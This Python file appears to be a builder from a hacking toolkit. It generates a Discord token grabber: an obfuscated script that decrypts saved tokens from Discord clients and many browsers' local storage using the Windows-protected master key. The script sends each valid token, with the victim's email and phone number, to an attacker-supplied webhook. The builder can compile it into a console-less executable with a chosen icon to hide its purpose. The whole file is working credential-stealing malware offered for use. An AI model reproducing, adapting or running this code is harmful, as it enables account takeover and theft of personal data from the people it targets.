# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    import base64
    import os
    import subprocess
    import sys
    import tkinter as tk
    from tkinter import filedialog
    try:
        from PIL import Image
        PIL_AVAILABLE = True
    except ImportError:
        PIL_AVAILABLE = False
except Exception as e:
    MissingModule(e)

Title("Discord Token Grabber Builder")
Connection()
CheckGithubStar()

def encode_webhook(webhook_url):
    parts = webhook_url.replace("https://discord.com/api/webhooks/", "").split("/")
    webhook_id = parts[0]
    webhook_token = parts[1]
    
    part1 = base64.b64encode("https://discord.com/api/webhooks/".encode()).decode()
    part2 = base64.b64encode(webhook_id.encode()).decode()
    part3 = base64.b64encode(webhook_token.encode()).decode()
    
    return part1, part2, part3

try:
    webhook = ChoiceWebhook()
    part1, part2, part3 = encode_webhook(webhook)
    
    print()
    filename = input(f"{INPUT} File Name {red}->{reset} ").strip()
    if not filename:
        ErrorInput()
    
    Scroll(f"""
{PREFIX}01{SUFFIX}{white} Python File
{PREFIX}02{SUFFIX}{white} Executable File""")
    
    file_type = input(f"\n{INPUT} File Type {red}->{reset} ").strip().lstrip("0")
    
    if file_type not in ["1", "2"]:
        ErrorChoice()
    
    Scroll(f"""
{PREFIX}01{SUFFIX}{white} With Console
{PREFIX}02{SUFFIX}{white} No Console""")
    
    console_choice = input(f"\n{INPUT} Console Type {red}->{reset} ").strip().lstrip("0")
    
    if console_choice not in ["1", "2"]:
        ErrorChoice()
    
    noconsole = console_choice == "2"
    icon_path = None
    temp_icon = False
    
    if file_type == "1":
        extension = ".pyw" if noconsole else ".py"
    else:
        extension = ".exe"
        
        icon_choice = input(f"\n{INPUT} Add an Icon? {YESORNO} {red}->{reset} ").strip().lower()
        
        if icon_choice in ["y", "yes"]:
            print(f"{INPUT} Select an Icon {red}->", reset)
            root = tk.Tk()
            root.withdraw()
            root.wm_attributes('-topmost', 1)
            icon_path = filedialog.askopenfilename(
                title="Select Icon File",
                filetypes=[("Image files", "*.ico *.png"), ("All files", "*.*")]
            )
            root.destroy()
            
            if icon_path:
                if icon_path.lower().endswith('.png'):
                    if not PIL_AVAILABLE:
                        print(f"{LOADING} Installing Pillow for icon conversion..", reset)
                        try:
                            subprocess.run([sys.executable, "-m", "pip", "install", "pillow"], check=True, capture_output=True)
                            from PIL import Image
                            print(f"{SUCCESS} Pillow installed!", reset)
                        except Exception as pil_error:
                            print(f"{ERROR} Failed to install Pillow:{red} {pil_error}", reset)
                            print(f"{INFO} Icon will not be used.", reset)
                            icon_path = None
                    
                    if icon_path:
                        print(f"{LOADING} Converting PNG to ICO..", reset)
                        try:
                            from PIL import Image
                            img = Image.open(icon_path)
                            ico_path = os.path.join(os.path.dirname(icon_path), os.path.splitext(os.path.basename(icon_path))[0] + ".ico")
                            img.save(ico_path, format='ICO', sizes=[(256, 256)])
                            icon_path = ico_path
                            temp_icon = True
                            print(f"{SUCCESS} Icon converted:{red} {os.path.basename(icon_path)}", reset)
                        except Exception as e:
                            print(f"{ERROR} Failed to convert icon:{red} {e}", reset)
                            icon_path = None
                else:
                    print(f"{SUCCESS} Icon selected:{red} {os.path.basename(icon_path)}", reset)
            else:
                print(f"{INFO} No icon selected.", reset)
    
    print(f"\n{LOADING} Generating Token Grabber File..", reset)
    
    Code = f'''import requests as _0x9a8b7c
import json as _0x6d5e4f
import os as _0x3c2b1a
import re as _0x8f7e6d
import base64 as _0x5c4d3e
import win32crypt as _0x2f1e0d
from Crypto.Cipher import AES as _0x7a6b5c
from datetime import datetime as _0x4e3f2a

_0x1a2b3c = "{part1}"
_0x4d5e6f = "{part2}"
_0x7g8h9i = "{part3}"

def _0xDecode():
    _p1 = _0x5c4d3e.b64decode(_0x1a2b3c).decode()
    _p2 = _0x5c4d3e.b64decode(_0x4d5e6f).decode()
    _p3 = _0x5c4d3e.b64decode(_0x7g8h9i).decode()
    return _p1 + _p2 + "/" + _p3

_0xURL = _0xDecode()

_0xR = _0x3c2b1a.getenv("APPDATA") or ""
_0xL = _0x3c2b1a.getenv("LOCALAPPDATA") or "" 

_0xPATHS = {{
    'Discord': _0xR + '\\\\discord',
    'Discord Canary': _0xR + '\\\\discordcanary',
    'Lightcord': _0xR + '\\\\Lightcord',
    'Discord PTB': _0xR + '\\\\discordptb',
    'Opera': _0xR + '\\\\Opera Software\\\\Opera Stable',
    'Opera GX': _0xR + '\\\\Opera Software\\\\Opera GX Stable',
    'Opera Neon': _0xR + '\\\\Opera Software\\\\Opera Neon',
    'Amigo': _0xR + '\\\\Amigo\\\\User Data',
    'Torch': _0xR + '\\\\Torch\\\\User Data',
    'Kometa': _0xR + '\\\\Kometa\\\\User Data',
    'Orbitum': _0xR + '\\\\Orbitum\\\\User Data',
    'CentBrowser': _0xR + '\\\\CentBrowser\\\\User Data',
    '7Star': _0xR + '\\\\7Star\\\\7Star\\\\User Data',
    'Sputnik': _0xR + '\\\\Sputnik\\\\Sputnik\\\\User Data',
    'Vivaldi': _0xR + '\\\\Vivaldi\\\\User Data\\\\Default',
    'Google Chrome': _0xR + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',
    'Google Chrome Profile 1': _0xR + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1',
    'Google Chrome Profile 2': _0xR + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2',
    'Google Chrome Profile 3': _0xR + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3',
    'Google Chrome Profile 4': _0xR + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4',
    'Google Chrome Profile 5': _0xR + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5',
    'Google Chrome SxS': _0xR + '\\\\Google\\\\Chrome SxS\\\\User Data\\\\Default',
    'Google Chrome Beta': _0xR + '\\\\Google\\\\Chrome Beta\\\\User Data\\\\Default',
    'Google Chrome Dev': _0xR + '\\\\Google\\\\Chrome Dev\\\\User Data\\\\Default',
    'Google Chrome Unstable': _0xR + '\\\\Google\\\\Chrome Unstable\\\\User Data\\\\Default',
    'Google Chrome Canary': _0xR + '\\\\Google\\\\Chrome Canary\\\\User Data\\\\Default',
    'Epic Privacy Browser': _0xR + '\\\\Epic Privacy Browser\\\\User Data',
    'Microsoft Edge': _0xR + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Default',
    'Uran': _0xR + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',
    'Yandex': _0xR + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',
    'Yandex Canary': _0xR + '\\\\Yandex\\\\YandexBrowserCanary\\\\User Data\\\\Default',
    'Yandex Developer': _0xR + '\\\\Yandex\\\\YandexBrowserDeveloper\\\\User Data\\\\Default',
    'Yandex Beta': _0xR + '\\\\Yandex\\\\YandexBrowserBeta\\\\User Data\\\\Default',
    'Yandex Tech': _0xR + '\\\\Yandex\\\\YandexBrowserTech\\\\User Data\\\\Default',
    'Yandex SxS': _0xR + '\\\\Yandex\\\\YandexBrowserSxS\\\\User Data\\\\Default',
    'Brave': _0xL + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',  
    'Iridium': _0xL + '\\\\Iridium\\\\User Data\\\\Default',
}}

def _0x1f2e3d(_0xa1):
    _0xa1 += '\\\\Local Storage\\\\leveldb'
    _0xa2 = []
    if not _0x3c2b1a.path.exists(_0xa1):
        return _0xa2
    for _0xa3 in _0x3c2b1a.listdir(_0xa1):
        if not _0xa3.endswith(".ldb") and not _0xa3.endswith(".log"):
            continue
        try:
            with open(_0x3c2b1a.path.join(_0xa1, _0xa3), "r", errors="ignore") as _0xa4:
                for _0xa5 in (x.strip() for x in _0xa4.readlines()):
                    for _0xa6 in _0x8f7e6d.findall(r"dQw4w9WgXcQ:[^\\"]*", _0xa5):
                        _0xa2.append(_0xa6)
        except PermissionError:
            continue
    return _0xa2

def _0x2e3f4a(_0xb1):
    try:
        with open(_0xb1 + "\\\\Local State", "r", encoding="utf-8") as _0xb2:
            _0xb3 = _0x6d5e4f.load(_0xb2)
        _0xb4 = _0x5c4d3e.b64decode(_0xb3["os_crypt"]["encrypted_key"])[5:]
        _0xb5 = _0x2f1e0d.CryptUnprotectData(_0xb4, None, None, None, 0)[1]
        return _0xb5
    except:
        return None

def _0x3f4a5b(_0xc1, _0xc2):
    try:
        if 'dQw4w9WgXcQ:' not in _0xc1:
            return None
        _0xc3 = _0x5c4d3e.b64decode(_0xc1.split('dQw4w9WgXcQ:')[1])
        _0xc4 = _0xc3[3:15]
        _0xc5 = _0xc3[15:-16]
        _0xc6 = _0x7a6b5c.new(_0xc2, _0x7a6b5c.MODE_GCM, _0xc4)
        return _0xc6.decrypt(_0xc5).decode()
    except Exception:
        return None

def _0x4a5b6c(_0xd1):
    _0xd2 = "https://discord.com/api/v9/users/@me"
    _0xd3 = {{"Authorization": _0xd1}}
    try:
        _0xd4 = _0x9a8b7c.get(_0xd2, headers=_0xd3, timeout=5)
        if _0xd4.status_code == 200:
            return _0xd4.json()
        return None
    except Exception:
        return None

def _0x5b6c7d(_0xe1):
    try:
        _0xe2 = _0xe1['info']
        _0xe3 = _0xe1['token']
        _0xe4 = _0xe1['path']
        _0xe5 = _0xe2.get('id', 'unknown')
        _0xe6 = _0xe2.get('avatar', '')
        if _0xe6:
            _0xe7 = f"https://cdn.discordapp.com/avatars/{{_0xe5}}/{{_0xe6}}.png"
        else:
            _0xe7 = "https://cdn.discordapp.com/embed/avatars/0.png"
        _0xe8 = _0xe2.get('premium_type', 0)
        _0xe9 = {{0: "No Nitro", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}}
        _0xea = _0xe9.get(_0xe8, f"Unknown ({{_0xe8}})")
        _0xeb = _0xe2.get('phone', 'None')
        if not _0xeb:
            _0xeb = 'None'
        _0xec = {{
            "username": "Buildware Gr4bb3r",
            "avatar_url": "https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png",
            "embeds": [{{
                "title": "🔐 Token Grabbed!",
                "color": 8847360,
                "thumbnail": {{"url": _0xe7}},
                "fields": [
                    {{"name": "👤 User Information", "value": f"```Username : {{_0xe2.get('username', 'N/A')}}\\nUser Id  : {{_0xe5}}\\nEmail    : {{_0xe2.get('email', 'N/A')}}\\nPhone    : {{_0xeb}}\\nNitro    : {{_0xea}}```", "inline": False}},
                    {{"name": "📂 Path", "value": f"```{{_0xe4}}```", "inline": False}},
                    {{"name": "🔐 Token", "value": f"```{{_0xe3}}```", "inline": False}}
                ],
                "footer": {{"text": "Buildware Gr4bb3r - github.com/v4lkyr0/Buildware-Tool", "icon_url": "https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png"}},
                "timestamp": _0x4e3f2a.now().astimezone().isoformat()
            }}]
        }}
        _0xed = _0x9a8b7c.post(_0xURL, json=_0xec)
        return _0xed.status_code in [200, 204]
    except Exception:
        return False

def _0x6c7d8e():
    _0xf1 = []
    for _0xf2, _0xf3 in _0xPATHS.items():
        if not _0x3c2b1a.path.exists(_0xf3):
            continue
        try:
            _0xf4 = _0x2e3f4a(_0xf3)
            if not _0xf4:
                continue
        except Exception:
            continue
        for _0xf5 in _0x1f2e3d(_0xf3):
            try:
                _0xf6 = _0x3f4a5b(_0xf5, _0xf4)
                if _0xf6 and _0xf6 not in _0xf1:
                    _0xf7 = _0x4a5b6c(_0xf6)
                    if _0xf7:
                        _0xf1.append(_0xf6)
                        _0xf8 = {{'token': _0xf6, 'info': _0xf7, 'path': _0xf3}}
                        _0x5b6c7d(_0xf8)
            except Exception:
                continue

if __name__ == "__main__":
    try:
        _0x6c7d8e()
    except Exception:
        pass
'''
    
    import shutil
    import time
    
    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Output/DiscordTokenGrabber")
    os.makedirs(output_dir, exist_ok=True)
    
    if extension == ".exe":
        temp_py = os.path.join(output_dir, f"{filename}.py")
        with open(temp_py, "w", encoding="utf-8") as f:
            f.write(Code)
        
        try:
            import pefile
        except ImportError:
            print(f"{LOADING} Installing pefile dependency..", reset)
            result = subprocess.run([sys.executable, "-m", "pip", "install", "pefile", "--force-reinstall"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{SUCCESS} pefile installed successfully!", reset)
            else:
                print(f"{ERROR} Failed to install pefile!", reset)
                if result.stderr:
                    print(f"{red}{result.stderr}{reset}")
        
        try:
            import PyInstaller
        except ImportError:
            print(f"{LOADING} Installation PyInstaller..", reset)
            result = subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "pefile"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{SUCCESS} PyInstaller installed successfully!", reset)
            else:
                print(f"{ERROR} Failed to install PyInstaller!", reset)
                if result.stderr:
                    print(f"{red}{result.stderr}{reset}")
        
        print(f"{LOADING} Building .exe file..", reset)
        
        try:
            pyinstaller_args = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--clean",
                f"--distpath={output_dir}",
                f"--workpath={os.path.join(output_dir, 'build')}",
                f"--specpath={output_dir}",
            ]
            
            if noconsole:
                pyinstaller_args.append("--noconsole")
            
            if icon_path:
                pyinstaller_args.append(f"--icon={icon_path}")
            
            pyinstaller_args.append(temp_py)
            
            result = subprocess.run(pyinstaller_args, capture_output=True, text=True)
            
            if result.returncode != 0:
                if os.path.exists(temp_py):
                    os.remove(temp_py)
                if temp_icon and icon_path and os.path.exists(icon_path):
                    os.remove(icon_path)
                print(f"{ERROR} PyInstaller build failed!", reset)
                if result.stderr:
                    print(f"{ERROR} Error output:", reset)
                    for line in result.stderr.split('\n')[-10:]:
                        if line.strip():
                            print(f"  {red}{line}{reset}")
                print(f"{INFO} Saving as Python file instead.", reset)
                extension = ".py"
                output_path = os.path.join(output_dir, f"{filename}{extension}")
                with open(output_path, "w", encoding="utf-8") as f:
                    f.write(Code)
                print(f"{SUCCESS} File created:{red} {output_path}", reset)
            else:
                if os.path.exists(temp_py):
                    os.remove(temp_py)
                
                spec_file = os.path.join(output_dir, f"{filename}.spec")
                if os.path.exists(spec_file):
                    os.remove(spec_file)
                
                build_dir = os.path.join(output_dir, "build")
                if os.path.exists(build_dir):
                    for i in range(3):
                        try:
                            time.sleep(0.5)
                            shutil.rmtree(build_dir, ignore_errors=True)
                            break
                        except:
                            continue
                
                if temp_icon and icon_path and os.path.exists(icon_path):
                    os.remove(icon_path)
                
                output_path = os.path.join(output_dir, f"{filename}.exe")
                print(f"{SUCCESS} Executable file created:{red} {output_path}", reset)
        except Exception as e:
            if os.path.exists(temp_py):
                os.remove(temp_py)
            if temp_icon and icon_path and os.path.exists(icon_path):
                os.remove(icon_path)
            
            spec_file = os.path.join(output_dir, f"{filename}.spec")
            if os.path.exists(spec_file):
                os.remove(spec_file)
            
            build_dir = os.path.join(output_dir, "build")
            if os.path.exists(build_dir):
                for i in range(5):
                    try:
                        time.sleep(0.5)
                        shutil.rmtree(build_dir, ignore_errors=True)
                        break
                    except:
                        continue
            
            print(f"{ERROR} Unexpected error:{red} {e}", reset)
            print(f"{INFO} Saving as Python file instead.", reset)
            extension = ".py"
            output_path = os.path.join(output_dir, f"{filename}{extension}")
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(Code)
            print(f"{SUCCESS} Python file created:{red} {output_path}", reset)
    else:
        output_path = os.path.join(output_dir, f"{filename}{extension}")
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(Code)
        print(f"{SUCCESS} Python file created:{red} {output_path}", reset)
    
    os.startfile(output_dir)
    Continue()
    Reset()

except Exception as e:
    Error(e)